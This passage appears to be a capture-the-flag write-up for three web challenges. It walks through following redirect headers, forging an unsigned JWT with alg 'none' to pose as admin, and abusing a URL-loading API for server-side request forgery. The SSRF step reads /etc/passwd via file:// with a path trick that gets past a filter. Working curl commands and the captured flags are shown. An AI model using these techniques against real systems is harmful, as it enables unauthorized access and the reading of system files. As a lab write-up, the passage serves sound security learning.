- I decided to check for the common file `robots.txt` that we all try to find and got a disallowed page.

- I proceeded with curl and noticed an header containing a portion of the flag and automatically redirects to the next page.At first,I couldn't use `GET` for it.I used header `OPTIONS` to find allowed http headers.

- Flag portion 1 is shown below and the next flag stop will be the path in the `Location` header.

- I wrote a <a href="https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/QUESTcon24/scripts/direction.py">script</a> to automate it.

### Challenge 2: The Admin

![image](https://github.com/user-attachments/assets/2c893638-2ee5-4086-ba07-333a1ee1d40a)

- The index page contains the documentation for the api.Route `auth` takes in a username and returns a jwt token created with the username and route `access` takes in the cookie and displays the username.

![image](https://github.com/user-attachments/assets/d985d91e-3733-4d32-9587-6719bc838327)

- I was able to get the flag by setting the `alg` key to `none`.

```bash
curl https://questcon-theadmin.chals.io/access -H "Authorization: Bearer $(echo '{"alg":"none","typ":"JWT"}' | base64).eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5ODYwNTM2fQ"
{"flag":"QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}"}%
```

- Flag-:```QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}```

### Challenge 3: TEMP

![image](https://github.com/user-attachments/assets/748470c8-b92f-4dc0-8d28-bb37d6de8963)

- I checked the source code aand noticed a `POST` request made to route `/api` which loads a url.

      fetch('/api', {
                      method: 'POST',
                      headers: {
                          'Content-Type': 'application/json',
                      },
                      body: JSON.stringify({ url: urlInput }),
                  })
- I made an http request to google and it worked.

      ‚ùØ curl https://questcon-temp.chals.io/api -H "Content-Type: application/json" -d '{"url": "https://www.google.com"}'
      {"data":"<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"en\"><head><meta content=\"Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for.\" name=\"description\"><meta content=\"noodp, \" name=\"robots\"><meta content=\"text/html; charset=UTF-8\"

- I tried to read `/etc/passwd` with `file://` schema which did not work because it was filtered.Then, I tred `/etc/./passwd` which worked.

- I got the flag by reading the source code stored in `/app/app.py`.I got this idea because most ctf challenges are stored in `/app/app.py`.
